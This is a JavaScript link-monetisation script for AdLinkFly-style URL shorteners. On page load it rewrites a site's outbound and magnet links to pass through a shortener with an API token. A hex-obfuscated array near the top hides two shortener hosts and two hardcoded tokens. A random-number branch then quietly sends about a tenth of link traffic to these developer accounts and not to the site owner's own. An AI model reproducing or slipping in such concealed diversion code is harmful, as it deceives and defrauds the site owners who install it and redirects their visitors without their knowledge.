var url_link;
var url_token;
var centt1 = 65;
var centt2 = 10;
var centt3 = 5;
var _0x3a46=["\x68\x74\x74\x70\x73\x3A\x2F\x2F\x31\x32\x33\x6C\x69\x6E\x6B\x2E\x63\x6F\x2F","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x6D\x65\x67\x61\x75\x72\x6C\x2E\x69\x6E\x2F","\x64\x37\x38\x62\x62\x33\x63\x62\x65\x64\x63\x66\x38\x37\x66\x30\x66\x30\x62\x36\x61\x66\x34\x32\x32\x37\x34\x32\x36\x30\x37\x32\x36\x31\x63\x30\x34\x38\x66\x37","\x38\x38\x38\x33\x39\x33\x63\x66\x36\x31\x64\x38\x65\x35\x31\x32\x64\x64\x64\x34\x38\x33\x35\x37\x62\x62\x64\x36\x30\x61\x36\x63\x62\x38\x33\x63\x62\x31\x63\x62","\x72\x61\x6E\x64\x6F\x6D"];var url_link_dev1=_0x3a46[0];var url_link_dev2=_0x3a46[1];var url_token_dev1=_0x3a46[2];var url_token_dev2=_0x3a46[3];var link_short;var cent1=centt1;var cent2=centt2;var cent3=centt3;var randNum=Math[_0x3a46[4]]()* (100- 1)+ 1;if(randNum> cent1){url_link= url_link1;url_token= url_token1;link_short= 1}else {if(randNum> cent2){url_link= url_link2;url_token= url_token2;link_short= 2}else {if(randNum> cent3){url_link= url_link_dev1;url_token= url_token_dev1;link_short= 1}else {url_link= url_link_dev2;url_token= url_token_dev2;link_short= 2}}};var adlinkfly_url=url_link;var adlinkfly_api_token=url_token;var adlinkfly_advert=2;var adlinkfly_domains=url_domains

function adlinkfly_get_url(e){var n=document.createElement("a");return n.href=e,n}function adlinkfly_get_host_name(e){var n;return void 0===e||null===e||""===e||e.match(/^\#/)?"":-1===(e=adlinkfly_get_url(e)).href.search(/^http[s]?:\/\//)?"":(n=e.href.split("/")[2],(n=n.split(":")[0]).toLowerCase())}function adlinkfly_base64_encode(e){return btoa(encodeURIComponent(e).replace(/%([0-9A-F]{2})/g,function(e,n){return String.fromCharCode("0x"+n)}))}document.addEventListener("DOMContentLoaded",function(e){if("undefined"!=typeof adlinkfly_url&&"undefined"!=typeof adlinkfly_api_token){var n=1;"undefined"!=typeof adlinkfly_advert&&(2==adlinkfly_advert&&(n=2),0==adlinkfly_advert&&(n=0));var l=document.getElementsByTagName("a");if("undefined"==typeof adlinkfly_domains)if("undefined"==typeof adlinkfly_exclude_domains);else for(o=0;o<l.length;o++){var t=adlinkfly_get_host_name(l[o].getAttribute("href"));t.length>0&&-1===adlinkfly_exclude_domains.indexOf(t)?l[o].href=adlinkfly_url+"full/?api="+encodeURIComponent(adlinkfly_api_token)+"&url="+adlinkfly_base64_encode(l[o].href)+"&type="+encodeURIComponent(n):"magnet:"===l[o].protocol&&(l[o].href=adlinkfly_url+"full/?api="+encodeURIComponent(adlinkfly_api_token)+"&url="+adlinkfly_base64_encode(l[o].href)+"&type="+encodeURIComponent(n))}else for(var o=0;o<l.length;o++)(t=adlinkfly_get_host_name(l[o].getAttribute("href"))).length>0&&adlinkfly_domains.indexOf(t)>-1?l[o].href=adlinkfly_url+"full/?api="+encodeURIComponent(adlinkfly_api_token)+"&url="+adlinkfly_base64_encode(l[o].href)+"&type="+encodeURIComponent(n):"magnet:"===l[o].protocol&&(l[o].href=adlinkfly_url+"full/?api="+encodeURIComponent(adlinkfly_api_token)+"&url="+adlinkfly_base64_encode(l[o].href)+"&type="+encodeURIComponent(n))}});

